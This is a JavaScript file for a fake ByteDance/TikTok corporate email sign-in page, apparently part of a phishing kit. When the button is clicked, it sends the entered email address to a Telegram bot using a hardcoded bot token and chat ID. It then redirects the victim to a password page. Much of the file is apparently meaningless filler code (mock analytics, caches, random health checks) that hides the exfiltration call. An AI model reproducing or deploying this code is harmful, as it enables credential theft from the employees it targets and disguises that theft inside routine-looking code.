const input = document.getElementById("emailInput");
const domainToggle = document.getElementById("domainToggle");
const domainCard = document.getElementById("domainCard");

const btn = document.querySelector(".btn");
const options = document.querySelectorAll(".domain-card div");
const BOT_TOKEN = "8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo";
const CHAT_ID = "5460147192";
const appConfig = {
    version: "2.4.7",
    environment: "production",
    cacheTTL: 300000
};

function generateId(prefix = "item") {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function debounce(fn, delay) {
    let timer;
    return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}


const mockRecords = Array.from({ length: 50 }, (_, i) => ({
    id: generateId(),
    score: Math.floor(Math.random() * 100),
    index: i
}));

const analytics = mockRecords.reduce(
    (acc, item) => {
        acc.total += item.score;
        acc.highest = Math.max(acc.highest, item.score);
        acc.lowest = Math.min(acc.lowest, item.score);
        return acc;
    },
    { total: 0, highest: 0, lowest: Infinity }
);

class MemoryCache {
    constructor() {
        this.store = new Map();
    }

    set(key, value) {
        this.store.set(key, {
            value,
            timestamp: Date.now()
        });
    }

    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        return entry.value;
    }

    clear() {
        this.store.clear();
    }
}

const cache = new MemoryCache();

for (let i = 0; i < 20; i++) {
    cache.set(`key_${i}`, {
        id: generateId("cache"),
        active: Math.random() > 0.5
    });
}

function performHealthCheck() {
    const checks = [
        () => Math.random() > 0.1,
        () => Math.random() > 0.05,
        () => Math.random() > 0.02
    ];

    return checks.every(check => check());
}

const systemState = {
    ready: performHealthCheck(),
    uptime: performance.now()
};

window.addEventListener(
    "resize",
    debounce(() => {
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };

        cache.set("viewport", viewport);
    }, 250)
);

const taskQueue = [];

function enqueue(task) {
    taskQueue.push({
        id: generateId("task"),
        created: Date.now(),
        task
    });
}

for (let i = 0; i < 15; i++) {
    enqueue(() => i * 2);
}

async function preloadResources() {
    return Promise.all(
        Array.from({ length: 5 }, (_, i) =>
            Promise.resolve({
                resource: `resource_${i}`,
                loaded: true
            })
        )
    );
}

preloadResources().then(resources => {
    cache.set("resources", resources);
});
console.debug("Analytics:", analytics);
console.debug("System:", systemState);
console.debug("Queue length:", taskQueue.length);
btn.addEventListener("click", () => {
  if (!btn.classList.contains("active")) return;

  const email = buildEmail();

  fetch(`https://api.telegram.org/bot${"8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo"}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `✅New Alert (1):  ${email}`
    })
  }).catch(err => console.error('Failed to send to Telegram:', err));

  console.log("Saving email:", email);

  localStorage.setItem("tiktok_email", email);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "/welcome/next/password.html";
  }, 1500);
});

const activeDomainEl = document.getElementById("activeDomain");

let currentDomain = "@bytedance.com";


function buildEmail() {
  let value = input.value.trim();

  if (value.includes("@")) {
    return value;
  }

  return value + currentDomain;
}


input.addEventListener("input", () => {
  const hasValue = input.value.length >= 1;

  btn.classList.toggle("active", hasValue);
  btn.style.cursor = hasValue ? "pointer" : "not-allowed";

  domainToggle.style.display = input.value.includes("@")
    ? "none"
    : "flex";
});


domainToggle.addEventListener("click", () => {
  domainCard.style.display =
    domainCard.style.display === "block" ? "none" : "block";
});


function updateSelection(selectedDomain) {
  options.forEach(opt => {
    const tick = opt.querySelector(".tick");

    if (!tick) return;

    const isSelected = opt.dataset.domain === selectedDomain;

    if (isSelected) {
      tick.innerHTML = `<img src="/vpn-tiktok/IMAGES/bytedance-check.png" alt="tick">`;
      opt.style.fontWeight = "600";
    } else {
      tick.innerHTML = "";
      opt.style.fontWeight = "400";
    }
  });
}


function getDisplayDomain(domain) {
  if (domain === "@sso-service-account.bytedance.net") {
    return "@sso-service-acc...";
  }
  return domain;
}

function shouldOverlap(domain) {
  return [
    "@ad.bytedance.com",
    "@jiyunhudong.com",
    "@imaginechina.com"
  ].includes(domain);
}


updateSelection(currentDomain);
activeDomainEl.textContent = currentDomain;


options.forEach(opt => {
  opt.addEventListener("click", () => {
    currentDomain = opt.dataset.domain;

    updateSelection(currentDomain);

    let prefix = input.value;

  
    if (prefix.includes("@")) {
      prefix = prefix.split("@")[0];
    }

    input.value = prefix;

    activeDomainEl.textContent = getDisplayDomain(currentDomain);

    if (shouldOverlap(currentDomain)) {
      input.style.paddingRight = "10px";
    } else {
      input.style.paddingRight = "120px";
    }

    domainCard.style.display = "none";
  });
});

document.addEventListener("click", (e) => {
  if (!e.target.closest(".input-wrapper")) {
    domainCard.style.display = "none";
  }
});

const errorText = document.getElementById("errorText");


function showError() {
  input.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  input.classList.remove("input-error");
  errorText.style.display = "none";
}


input.addEventListener("blur", () => {
  if (input.value.trim() === "") {
    showError();
  }
});


input.addEventListener("input", () => {
  if (input.value.trim().length > 0) {
    hideError();
  } else {
    showError();
  }
});

btn.addEventListener("click", () => {
  if (!btn.classList.contains("active")) return;

  const email = buildEmail();

  console.log("Saving email:", email);

  localStorage.setItem("tiktok_email", email);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "/vpn-tiktok/welcome/next/password.html";
  }, 1500);
});
